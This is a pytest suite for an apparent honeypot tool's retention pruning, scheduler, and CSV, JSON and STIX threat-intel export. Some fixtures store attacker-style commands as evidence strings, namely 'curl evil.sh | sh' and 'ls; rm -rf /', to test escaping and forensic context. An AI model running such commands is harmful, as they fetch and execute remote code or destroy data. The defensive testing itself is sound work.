"""
Tests for retention pruning and SIEM export formats.
"""

import csv
import io
import json
import tempfile
import threading
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from starlette.testclient import TestClient

from antlion.core.types import (
    AttackCategory,
    DecoyServiceType,
    FlowRecord,
    InteractionDepth,
    SeverityLevel,
    Verdict,
)
from antlion.query.export import export_verdicts, to_csv, to_json, to_stix
from antlion.storage.database import AntlionDatabase
from antlion.storage.prune import (
    PRUNABLE_TABLES,
    RetentionManager,
    RetentionScheduler,
)


@pytest.fixture
def db():
    return AntlionDatabase(Path(tempfile.mkdtemp()) / "retention.db")


def make_verdict(ip="1.2.3.4", days_old=0, attack=AttackCategory.RECON_SCAN,
                 severity=SeverityLevel.HIGH, confidence=0.85):
    ts = datetime.now(timezone.utc) - timedelta(days=days_old)
    v = Verdict(
        source_ip=ip,
        target_service="SSH",
        attack_type=attack,
        severity=severity,
        confidence=confidence,
    )
    v.timestamp = ts
    return v


def seed(db, count, days_old=0, ip_prefix="9.9"):
    for i in range(count):
        db.persist_verdict(make_verdict(ip=f"{ip_prefix}.{i // 256}.{i % 256}", days_old=days_old))


# ---------------------------------------------------------------------------
# RetentionManager
# ---------------------------------------------------------------------------


def test_cutoff_is_retention_days_ago(db):
    m = RetentionManager(db=db, retention_days=7)
    now = datetime.now(timezone.utc)
    cutoff = datetime.fromisoformat(m.cutoff(now))
    delta = (now - cutoff).days
    assert 6 <= delta <= 7


def test_retention_disabled_at_zero_days(db):
    assert RetentionManager(db=db, retention_days=0).enabled is False


def test_prune_is_noop_when_disabled(db):
    seed(db, 10, days_old=100)
    result = RetentionManager(db=db, retention_days=0).prune_once()
    assert result.total_deleted == 0
    assert len(db.query_verdicts(limit=100)) == 10


def test_prune_deletes_expired_verdicts(db):
    seed(db, 5, days_old=60)
    seed(db, 5, days_old=1, ip_prefix="8.8")

    result = RetentionManager(db=db, retention_days=30).prune_once()

    assert result.deleted["verdicts"] == 5
    remaining = db.query_verdicts(limit=100)
    assert len(remaining) == 5
    assert all("8.8." in v["source_ip"] for v in remaining)


def test_prune_keeps_records_within_window(db):
    seed(db, 20, days_old=2)
    result = RetentionManager(db=db, retention_days=30).prune_once()
    assert result.total_deleted == 0
    assert len(db.query_verdicts(limit=100)) == 20


def test_prune_covers_all_prunable_tables(db):
    assert set(PRUNABLE_TABLES) == {"verdicts", "decoy_events", "flow_records"}


def test_prune_deletes_expired_flow_records(db):
    from antlion.core.types import DecoyEvent

    old = datetime.now(timezone.utc) - timedelta(days=90)
    for i in range(3):
        flow = FlowRecord(
            flow_id=f"old-{i}", src_ip="7.7.7.7", src_port=1,
            dst_ip="10.0.0.1", dst_port=80, protocol=6, timestamp=old,
            features={"a": 1.0},
        )
        db.persist_flow_record(flow)

    result = RetentionManager(db=db, retention_days=30).prune_once()
    assert result.deleted["flow_records"] == 3


def test_prune_batches_large_backlog(db):
    """Deletion must batch so a large backlog does not hold a long write lock."""
    seed(db, 250, days_old=100)

    m = RetentionManager(db=db, retention_days=30, batch_size=40)
    result = m.prune_once()

    assert result.deleted["verdicts"] == 250
    assert len(db.query_verdicts(limit=1000)) == 0


def test_prune_with_batch_size_one(db):
    seed(db, 7, days_old=100)
    m = RetentionManager(db=db, retention_days=30, batch_size=1)
    assert m.prune_once().deleted["verdicts"] == 7


def test_count_expired_does_not_delete(db):
    seed(db, 10, days_old=90)
    seed(db, 10, days_old=1, ip_prefix="8.8")

    m = RetentionManager(db=db, retention_days=30)
    counts = m.count_expired()

    assert counts["verdicts"] == 10
    assert len(db.query_verdicts(limit=100)) == 20


def test_prune_is_idempotent(db):
    seed(db, 10, days_old=90)
    m = RetentionManager(db=db, retention_days=30)

    first = m.prune_once()
    second = m.prune_once()

    assert first.total_deleted == 10
    assert second.total_deleted == 0


def test_prune_result_dict(db):
    seed(db, 3, days_old=90)
    result = RetentionManager(db=db, retention_days=30).prune_once()
    d = result.to_dict()
    assert d["total_deleted"] == 3
    assert "elapsed_seconds" in d


def test_prune_tolerates_missing_tables(db):
    """A partially initialised database must not crash the sweep."""
    m = RetentionManager(db=db, retention_days=30)
    db._get_connection().execute("DROP TABLE flow_records")
    result = m.prune_once()  # must not raise
    assert result.deleted.get("verdicts") == 0


# ---------------------------------------------------------------------------
# RetentionScheduler
# ---------------------------------------------------------------------------


def test_scheduler_runs_periodically(db):
    seed(db, 10, days_old=90)

    m = RetentionManager(db=db, retention_days=30)
    s = RetentionScheduler(manager=m, interval_seconds=0.05)
    s.start()
    try:
        deadline = time.time() + 5.0
        while time.time() < deadline and len(db.query_verdicts(limit=100)) > 0:
            time.sleep(0.05)
        assert len(db.query_verdicts(limit=100)) == 0
        assert s.run_count >= 1
    finally:
        s.stop()


def test_scheduler_not_started_when_disabled(db):
    m = RetentionManager(db=db, retention_days=0)
    s = RetentionScheduler(manager=m, interval_seconds=0.05)
    s.start()
    try:
        assert s.running is False
    finally:
        s.stop()


def test_scheduler_stop_is_idempotent(db):
    m = RetentionManager(db=db, retention_days=30)
    s = RetentionScheduler(manager=m, interval_seconds=60)
    s.start()
    s.stop()
    s.stop()  # must not raise
    assert s.running is False


def test_scheduler_survives_prune_exception(db, monkeypatch):
    m = RetentionManager(db=db, retention_days=30)
    calls = []

    def boom():
        calls.append(1)
        raise RuntimeError("prune failed")

    monkeypatch.setattr(m, "prune_once", boom)

    s = RetentionScheduler(manager=m, interval_seconds=0.05)
    s.start()
    try:
        time.sleep(0.3)
        assert len(calls) >= 2, "scheduler died after first exception"
        assert s.running is True
    finally:
        s.stop()


def test_scheduler_start_is_not_duplicated(db):
    m = RetentionManager(db=db, retention_days=30)
    s = RetentionScheduler(manager=m, interval_seconds=60)
    s.start()
    try:
        first = s._thread
        s.start()
        assert s._thread is first
    finally:
        s.stop()


# ---------------------------------------------------------------------------
# CSV export
# ---------------------------------------------------------------------------


def test_csv_has_header_and_rows(db):
    seed(db, 3)
    out = to_csv(db.query_verdicts(limit=10))
    rows = list(csv.DictReader(io.StringIO(out)))
    assert len(rows) == 3
    assert rows[0]["source_ip"]
    assert rows[0]["severity"] in ("LOW", "MEDIUM", "HIGH", "CRITICAL")


def test_csv_flattens_evidence(db):
    v = make_verdict()
    v.raw_evidence = {
        "commands": ["uname -a", "curl evil.sh | sh"],
        "username": "root",
        "http_path": "/login",
        "heuristic_count": 3,
        "evasion_detected": True,
    }
    db.persist_verdict(v)

    rows = list(csv.DictReader(io.StringIO(to_csv(db.query_verdicts(limit=10)))))
    assert rows[0]["commands"] == "uname -a; curl evil.sh | sh"
    assert rows[0]["username"] == "root"
    assert rows[0]["heuristic_count"] == "3"
    assert rows[0]["evasion_detected"] == "True"


def test_csv_semicolons_cannot_break_rows(db):
    for i, cmd in enumerate(["ls; rm -rf /", 'echo "quoted"', "a,b,c"]):
        v = make_verdict(ip=f"5.5.5.{i}")
        v.raw_evidence = {"commands": [cmd]}
        db.persist_verdict(v)

    out = to_csv(db.query_verdicts(limit=10))
    rows = list(csv.DictReader(io.StringIO(out)))
    assert len(rows) == 3


def test_csv_of_empty_result_is_header_only(db):
    out = to_csv([])
    assert out.strip().startswith("verdict_id")
    assert len(list(csv.DictReader(io.StringIO(out)))) == 0


# ---------------------------------------------------------------------------
# JSON export
# ---------------------------------------------------------------------------


def test_json_is_valid_and_complete(db):
    seed(db, 2)
    parsed = json.loads(to_json(db.query_verdicts(limit=10)))
    assert isinstance(parsed, list)
    assert len(parsed) == 2
    assert "verdict_id" in parsed[0]
    assert "contributing_signals" in parsed[0]


# ---------------------------------------------------------------------------
# STIX export
# ---------------------------------------------------------------------------


def test_stix_bundle_is_wellformed(db):
    seed(db, 2)
    bundle = json.loads(to_stix(db.query_verdicts(limit=10)))

    assert bundle["type"] == "bundle"
    assert bundle["spec_version"] == "2.1"
    assert len(bundle["objects"]) == 2
    assert all(o["type"] == "indicator" for o in bundle["objects"])


def test_stix_ids_are_valid_uuid5(db):
    seed(db, 1)
    bundle = json.loads(to_stix(db.query_verdicts(limit=10)))
    ind = bundle["objects"][0]
    assert ind["id"].startswith("indicator--")
    # 8-4-4-4-12
    uuid_part = ind["id"].split("--")[1]
    assert len(uuid_part) == 36


def test_stix_pattern_matches_ipv4(db):
    db.persist_verdict(make_verdict(ip="203.0.113.5"))
    bundle = json.loads(to_stix(db.query_verdicts(limit=10)))
    assert bundle["objects"][0]["pattern"] == "[ipv4-addr:value = '203.0.113.5']"


def test_stix_pattern_quotes_ipv6(db):
    db.persist_verdict(make_verdict(ip="2001:db8::1"))
    bundle = json.loads(to_stix(db.query_verdicts(limit=10)))
    pattern = bundle["objects"][0]["pattern"]
    assert pattern == "[ipv6-addr:value = '2001:db8::1']"


def test_stix_confidence_is_percentage(db):
    db.persist_verdict(make_verdict(confidence=0.87))
    bundle = json.loads(to_stix(db.query_verdicts(limit=10)))
    assert bundle["objects"][0]["confidence"] == 87


def test_stix_preserves_forensic_context(db):
    v = make_verdict()
    v.raw_evidence = {"commands": ["curl evil"], "username": "root"}
    db.persist_verdict(v)

    bundle = json.loads(to_stix(db.query_verdicts(limit=10)))
    ctx = bundle["objects"][0]["x_antlion_context"]
    assert ctx["commands"] == ["curl evil"]
    assert ctx["username"] == "root"


def test_stix_labels_include_severity(db):
    db.persist_verdict(make_verdict(severity=SeverityLevel.CRITICAL))
    bundle = json.loads(to_stix(db.query_verdicts(limit=10)))
    assert "CRITICAL" in bundle["objects"][0]["labels"]


def test_stix_of_empty_result_is_valid_bundle(db):
    bundle = json.loads(to_stix([]))
    assert bundle["objects"] == []


# ---------------------------------------------------------------------------
# export_verdicts dispatcher
# ---------------------------------------------------------------------------


def test_export_dispatches_by_format(db):
    seed(db, 2)
    assert "verdict_id" in export_verdicts(db=db, fmt="csv", limit=10)
    assert isinstance(json.loads(export_verdicts(db=db, fmt="json", limit=10)), list)
    assert json.loads(export_verdicts(db=db, fmt="stix", limit=10))["type"] == "bundle"


def test_export_rejects_unknown_format(db):
    with pytest.raises(ValueError, match="Unsupported export format"):
        export_verdicts(db=db, fmt="xml", limit=10)


def test_export_defaults_to_csv(db):
    seed(db, 1)
    assert "verdict_id" in export_verdicts(db=db, limit=10)


def test_export_filters_by_ip(db):
    db.persist_verdict(make_verdict(ip="1.1.1.1"))
    db.persist_verdict(make_verdict(ip="2.2.2.2"))

    out = export_verdicts(db=db, fmt="csv", limit=10, source_ip="1.1.1.1")
    assert "1.1.1.1" in out
    assert "2.2.2.2" not in out


# ---------------------------------------------------------------------------
# API endpoints
# ---------------------------------------------------------------------------


@pytest.fixture
def api_client():
    from antlion.query.api import create_query_api
    from antlion.core.config import AntlionConfig

    cfg = AntlionConfig(data_dir=Path(tempfile.mkdtemp()))
    cfg.api_key = "k"
    return TestClient(create_query_api(db=AntlionDatabase(cfg.get_db_path()), config=cfg))


AUTH = {"X-API-Key": "k"}


def test_export_endpoints_require_auth(api_client):
    assert api_client.get("/api/v1/export/verdicts.csv").status_code == 401
    assert api_client.get("/api/v1/export/stix").status_code == 401
    assert api_client.get("/api/v1/retention/status").status_code == 401


def test_csv_endpoint(api_client):
    r = api_client.get("/api/v1/export/verdicts.csv", headers=AUTH)
    assert r.status_code == 200
    assert "verdict_id" in r.text


def test_stix_endpoint(api_client):
    r = api_client.get("/api/v1/export/stix", headers=AUTH)
    assert r.status_code == 200
    assert json.loads(r.text)["type"] == "bundle"


def test_retention_status_endpoint(api_client):
    r = api_client.get("/api/v1/retention/status", headers=AUTH)
    assert r.status_code == 200
    body = r.json()
    assert "retention_days" in body
    assert "expired_counts" in body


def test_retention_prune_endpoint(api_client):
    r = api_client.post("/api/v1/retention/prune", headers=AUTH)
    assert r.status_code == 200
    assert "enabled" in r.json()